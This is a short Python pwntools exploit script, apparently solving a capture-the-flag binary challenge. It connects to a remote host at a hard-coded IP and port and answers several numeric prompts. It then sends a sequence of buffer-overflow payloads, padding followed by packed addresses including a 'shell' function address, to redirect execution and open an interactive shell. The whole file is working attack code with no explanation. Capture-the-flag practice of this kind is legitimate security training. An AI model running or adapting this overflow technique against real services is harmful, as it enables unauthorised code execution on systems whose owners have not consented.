from pwn import *

def exploit():
    # p = process("./main")
    p = remote("103.146.203.17", 4000)

    shell = 0x000000000040148b

    payload = ''
    payload += 'A' * 24
    # payload += 'B' * 8

    p.sendline(payload)
    p.sendlineafter("1: ", str(37))
    p.sendlineafter("2: ", str(1337))
    p.sendlineafter("3: ", str(53949297))
    # p.sendline(str(53949297))
    p.sendlineafter("message: ", 'HACKME')
    p.sendlineafter("choice: ", '2')
    p.sendline('C' * 72 + p64(shell))
    p.sendlineafter("choice: ", '2')
    p.sendline('C' * 71)
    p.sendlineafter("choice: ", '2')
    p.sendafter("name: ", 'C' * 71 + '\x00')
    p.sendlineafter("choice: ", '2')
    p.sendafter("name: ", 'C' * 70 + '\x00')
    p.sendlineafter("choice: ", '2')
    p.sendafter("name: ", 'C' * 69 + '\x00')
    p.sendlineafter("choice: ", '2')
    p.sendafter("name: ", 'C' * 68 + '\x00')
    p.sendlineafter("choice: ", '2')
    p.sendafter("name: ", 'B' * 63 + '\x00')
    p.sendlineafter("choice: ", '2')
    p.sendafter("name: ", 'C' * 64 + p64(0x3373371))
    p.sendlineafter("choice: ", '2')
    p.sendafter("name: ", 'C' * 63 + '\x00')
    p.sendlineafter("choice: ", '2')
    p.sendafter("name: ", 'C' * 62 + '\x00')
    p.sendlineafter("choice: ", '2')
    p.sendafter("name: ", 'C' * 61 + '\x00')
    p.sendlineafter("choice: ", '2')
    p.sendafter("name: ", 'C' * 60 + '\x00')
    p.sendlineafter("choice: ", '2')
    p.sendafter("name: ", 'B' * 56 + p64(0x40201c))
    p.sendlineafter("choice: ", '2')
    p.sendline('C' * 55 + '\x00')
    p.sendlineafter("choice: ", '2')
    p.sendline('C' * 52 + p64(0x539))
    p.sendlineafter("choice: ", "2")
    p.sendline('C' * 48 + p32(37))
    p.sendline(str(1))

    # gdb.attach(p, '''
    #         # b *0x000000000040148b
    #         # b *0x4014cc
    #         b *0x40158f
    #         c
    #         ''')

    p.interactive()

if __name__ == "__main__":
    exploit()